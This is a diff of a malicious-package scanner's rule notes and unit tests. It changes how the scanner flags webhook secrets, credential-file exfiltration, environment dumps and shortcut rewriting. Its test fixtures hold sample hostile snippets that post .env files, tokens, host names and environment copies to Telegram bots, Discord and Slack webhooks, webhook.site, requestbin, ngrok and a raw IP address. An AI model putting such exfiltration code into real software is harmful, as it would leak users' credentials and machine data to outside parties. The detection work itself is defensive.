@@ -2,18 +2,18 @@
 caught and Lazaret didn't), strong wherever found — install scripts,
 import-time code, the files a package runs when used:
 
-* a chat bot or webhook whose secret is written in the code (a Telegram bot
-  token next to api.telegram.org, a Discord webhook, a Slack webhook) in a
-  file that makes network calls;
-* credential files (.env, .npmrc …) read in a file that sends data to a raw
-  public IP address;
+* a request to a webhook whose secret is written in the code (any service:
+  a Telegram bot's token, a Discord webhook's, a Slack webhook's key in the
+  URL's path, or in a name a template's hole gives it);
 * three or more credential folders named in one place (.ssh, .aws, .ethereum
   …), with network calls: a sweep of the home folder;
 * the machine's user or host name sent to an address kept base64-encoded, or
-  in a DNS lookup of a name the code builds; its public IP address sent to a
-  data-capture service (an ngrok tunnel's own address counts as one);
-* a copy of the whole environment serialized (`d = dict(os.environ)` …
-  `urlencode(d)`), read by the harvest test;
+  in a DNS lookup of a name the code builds;
+* at import time, local data read as a flow (a credential file, the host
+  name, the public IP address a lookup service answers, the whole
+  environment) sent to a data-capture service (an ngrok tunnel's own address
+  counts as one) or a raw public IP address: the list is where the data
+  goes, not a sign on its own;
 * a reverse shell given as an argument list, or to an ngrok TCP address;
 * a cryptocurrency miner (a Monero wallet address and a pool's arguments);
 * curl or wget given `-o path` in an argument list, and the file run with
@@ -46,7 +46,7 @@ from lazaret.scanner import core
 TG = "1234567" + "89:AA" + "bC3dE5fG7hJ9kL1mN3pQ5rS7tV9wX1yZ3"
 DISCORD = ("discord.com/api/webhooks/" + "123456789012345678/"
            + "aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789-_aBcDeFgHiJkLmNoPqRsTuVwXyZ01")
-SLACK = "hooks.slack.com/services/" + "TABCDEF12/" + "BABCDEF12/" + "aBcDeFgHiJkLmNoPqRsTuVwX"
+SLACK = "hooks.slack.com/services/" + "TABCDEF12/" + "BABCDEF12/" + "aBcDeFgHiJkLmNoPqRsTuV12"
 XMR = "4" + ("AbCdEfGhJk" * 10)[:94]
 
 
@@ -55,26 +55,40 @@ def on_import(text, lang="py"):
     return reasons, core.import_time_severity(reasons) if reasons else None
 
 
-class ChatSecretTests(unittest.TestCase):
+WEBHOOK = "sends data to a webhook whose secret is written in the code ({})"
+
+
+class WebhookSecretTests(unittest.TestCase):
+    """0.1.8: any service's webhook (0.1.7 knew Telegram's, Discord's and
+    Slack's shapes): a credential in the path of a URL a request is given."""
+
     def test_a_telegram_bot_token_in_the_code(self):
         text = ("import requests\nTOKEN = '" + TG + "'\ndef initialize():\n"
                 "    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument', files={'document': open(z, 'rb')})\n")
-        self.assertEqual(on_import(text), (["sends data to a Telegram bot whose token is written in the code "
-                                            "(bot 123456789)"], "CRITICAL"))
+        self.assertEqual(on_import(text), ([WEBHOOK.format("api.telegram.org")], "CRITICAL"))
         inline = "import requests\nrequests.get(f'https://api.telegram.org/bot" + TG + "/sendMessage?text={m}')\n"
         self.assertEqual(on_import(inline)[1], "CRITICAL")
         shell = "const { exec } = require('child_process');\nconst T = '" + TG + "';\n" \
                 "exec(`curl -s \"https://api.telegram.org/bot${T}/sendMessage?chat_id=1&text=${t}\"`);\n"
         self.assertEqual(on_import(shell, "js")[1], "CRITICAL")
-        self.assertIn("sends data to a Telegram bot whose token is written in the code (bot 123456789)",
-                      core.install_script_risk(text))
+        self.assertEqual(core.install_script_risk(text), [WEBHOOK.format("api.telegram.org"),
+                                                          "contacts an address typical of data exfiltration "
+                                                          "(api.telegram.org)"])
 
     def test_discord_and_slack_webhooks(self):
         self.assertEqual(on_import("const u = 'https://" + DISCORD + "';\nfetch(u, { method: 'POST' });\n", "js"),
-                         (["sends data to a Discord webhook whose token is written in the code "
-                           "(webhook 123456789012345678)"], "CRITICAL"))
+                         ([WEBHOOK.format("discord.com")], "CRITICAL"))
         self.assertEqual(on_import("var webhookUrl = 'https://" + SLACK + "';\nawait fetch(webhookUrl, {});\n", "js"),
-                         (["sends data to a Slack webhook whose key is written in the code (TABCDEF12)"], "CRITICAL"))
+                         ([WEBHOOK.format("hooks.slack.com")], "CRITICAL"))
+
+    def test_any_service_and_the_scripts_own_wrapper(self):
+        key = "Zx9" + "Qw7Er5Ty3Ui1Op0As2Df4Gh6"
+        wrapper = ("import requests\nHOOK = 'https://hooks.x.invalid/in/" + key + "'\n"
+                   "def send(url, payload):\n    return requests.post(url, json=payload)\n"
+                   "send(HOOK, {'m': 1})\n")
+        self.assertEqual(on_import(wrapper), ([WEBHOOK.format("hooks.x.invalid")], "CRITICAL"))
+        xhr = ("const x = new XMLHttpRequest();\nx.open('POST', 'https://in.x.invalid/w/" + key + "');\nx.send(d);\n")
+        self.assertEqual(on_import(xhr, "js"), ([WEBHOOK.format("in.x.invalid")], "CRITICAL"))
 
     def test_quiet_without_a_secret_or_network_calls(self):
         for text in (
@@ -89,17 +103,23 @@ class ChatSecretTests(unittest.TestCase):
                 "import requests\nrequests.post('https://hooks.slack.com/services/T00000000/B00000000/" + "X" * 24 + "')\n",
                 "import requests\nrequests.post('https://hooks.slack.com/services/T0000/B0000/abc')\n",
                 "import requests\nrequests.post('https://discord.com/api/webhooks/{id}/{token}')\n",
-                "import requests\nT = '123456789:AA" + "A" * 33 + "'\nrequests.post('https://api.telegram.org/bot' + T)\n"):
+                "import requests\nT = '123456789:AA" + "A" * 33 + "'\nrequests.post('https://api.telegram.org/bot' + T)\n",
+                # a path of words, a slug, a hash, a document's id not requested
+                "import requests\nrequests.post('https://x.invalid/api/v2/GetUserProfileInformation')\n",
+                "import requests\nrequests.get('https://x.invalid/blog/my-project-release-notes-2024')\n",
+                "import requests\nrequests.get('https://x.invalid/c/3f2a1b4c5d6e7f8091a2b3c4d5e6f708')\n",
+                "DOC = 'https://docs.x.invalid/d/" + "Zx9Qw7Er5Ty3Ui1Op0As2Df4Gh6" + "/edit'\n"):
             with self.subTest(text[:60]):
                 self.assertEqual(on_import(text)[0], [])
 
 
 class CredentialTests(unittest.TestCase):
     def test_credential_files_sent_to_an_ip_address(self):
+        # (0.1.8: the file's flow into the request, and the address it goes to)
         text = ("const fs = require('fs');\nconst https = require('https');\nconst d = fs.readFileSync('.env', 'utf8');\n"
                 "https.get(`https://203.0.113.9:8855/1?data=${encodeURIComponent(d)}`);\n"
                 "const n = fs.readFileSync('~/.npmrc', 'utf8');\n")
-        self.assertEqual(on_import(text, "js"), (["reads credential files and sends data to an IP address "
+        self.assertEqual(on_import(text, "js"), (["reads local files and sends them to an IP address "
                                                    "(203.0.113.9)"], "CRITICAL"))
 
     def test_a_sweep_of_credential_folders(self):
@@ -140,6 +160,7 @@ class HostAndAddressTests(unittest.TestCase):
         self.assertEqual(on_import(js, "js")[1], "CRITICAL")
 
     def test_the_public_ip_address_to_a_capture_service(self):
+        # (0.1.8: what a lookup service answers is the machine's public IP address, a local datum)
         text = ("import threading, os, platform, requests\ndef _notify():\n"
                 "    ip = requests.get('https://api.ipify.org', timeout=2).text\n"
                 "    requests.post('https://webhook.site/0000-1111', json={'os': platform.platform(), 'ip': ip})\n"
@@ -162,7 +183,9 @@ class HostAndAddressTests(unittest.TestCase):
                 # a public IP address looked up for a mirror, no capture service
                 "import requests\nip = requests.get('https://ipinfo.io/json').json()\nrequests.get(MIRRORS[ip['country']])\n",
                 # ngrok's own API and a client that names the service
-                "import socket, requests\nh = socket.gethostname()\nrequests.get('https://api.ngrok.com/tunnels')\n"):
+                "import socket, requests\nh = socket.gethostname()\nrequests.get('https://api.ngrok.com/tunnels')\n",
+                # the host name and a capture service in one file, the host name not sent (0.1.7 made this CRITICAL)
+                "import socket, requests\nh = socket.gethostname()\nprint(h)\nrequests.get('https://webhook.site/x')\n"):
             with self.subTest(text[:60]):
                 self.assertEqual(on_import(text)[0], [])
 
@@ -289,8 +312,12 @@ class RequestBinTests(unittest.TestCase):
         for host in ("requestbin.com", "enx1.x.requestbin.net", "requestbin.io", "requestb.in"):
             with self.subTest(host):
                 text = f"const https = require('https');\nhttps.get('https://{host}/r/abc?d=' + process.env.NPM_TOKEN);\n"
+                # (0.1.8: a token in a request's address counts where the address is a capture service's)
                 self.assertEqual(core.install_script_risk(text),
-                                 [f"contacts an address typical of data exfiltration ({host.split('x.')[-1]})"])
+                                 ["sends environment variables over the network (NPM_TOKEN)",
+                                  f"contacts an address typical of data exfiltration ({host.split('x.')[-1]})"])
+        mirror = "const https = require('https');\nhttps.get('https://mirror.x.invalid/d?t=' + process.env.NPM_TOKEN);\n"
+        self.assertEqual(core.install_script_risk(mirror), [])
         beacon = ("import socket, requests\n"
                   "requests.post('https://requestbin.net/r/abc', data=socket.gethostname())\n")
         self.assertEqual(on_import(beacon), (["sends the machine's user or host name to a data-capture service "
@@ -304,7 +331,7 @@ class EnvironmentCopyTests(unittest.TestCase):
                 "    url = 'https://5cecdbdb.ngrok.app/collect'\n"
                 "    urllib.request.urlopen(urllib.request.Request(url, data=encoded))\n")
         self.assertEqual(on_import(text), (["reads credentials or the whole environment and sends them to an "
-                                            "exfiltration service (ngrok)"], "CRITICAL"))
+                                            "exfiltration service (5cecdbdb.ngrok.app)"], "CRITICAL"))
         js = "const https = require('https');\nconst e = { ...process.env };\nconst body = JSON.stringify(e);\nhttps.request(o).end(body);\n"
         self.assertEqual(on_import(js, "js"), (["reads credentials or the whole environment and sends data over the "
                                                  "network"], "MAJOR"))
@@ -397,13 +424,21 @@ class InstallTimeTests(unittest.TestCase):
         # not at import time: a client connects to addresses
         self.assertEqual(on_import(setup)[0], [])
 
-    def test_browser_shortcuts_rewritten(self):
+    def test_shortcuts_rewritten(self):
+        """0.1.8: the shortcuts a machine has, found and changed — whatever
+        they are made to start (python-dateuti: a browser extension)."""
+        reason = "rewrites the shortcuts of programs on the machine"
         setup = ("from win32com.client import Dispatch\nshell = Dispatch('WScript.Shell')\n"
                  "for f in files:\n    if f.endswith('.lnk'):\n        s = shell.CreateShortcut(root + f)\n"
                  "        s.Arguments = '--load-extension={p}\\\\Extension'\n        s.Save()\n")
-        self.assertIn("rewrites browser shortcuts to load an extension", core.install_script_risk(setup))
+        self.assertIn(reason, core.install_script_risk(setup))
+        self.assertIn(reason, core.install_script_risk(setup.replace("'--load-extension={p}\\\\Extension'", "'/c x.exe'")))
+        self.assertIn(reason, core.install_script_risk(
+            "for (const f of glob.sync('*.lnk')) { const s = sh.CreateShortcut(f); s.TargetPath = exe; s.Save(); }"))
         selenium = "from selenium import webdriver\no = webdriver.ChromeOptions()\no.add_argument('--load-extension=ext')\n"
-        self.assertNotIn("rewrites browser shortcuts to load an extension", core.install_script_risk(selenium))
+        self.assertNotIn(reason, core.install_script_risk(selenium))
+        own = ("s = shell.CreateShortcut(os.path.join(desktop, 'MyApp.lnk'))\ns.TargetPath = exe\ns.Save()\n")
+        self.assertNotIn(reason, core.install_script_risk(own))     # an installer's own shortcut
 
 
 if __name__ == "__main__":
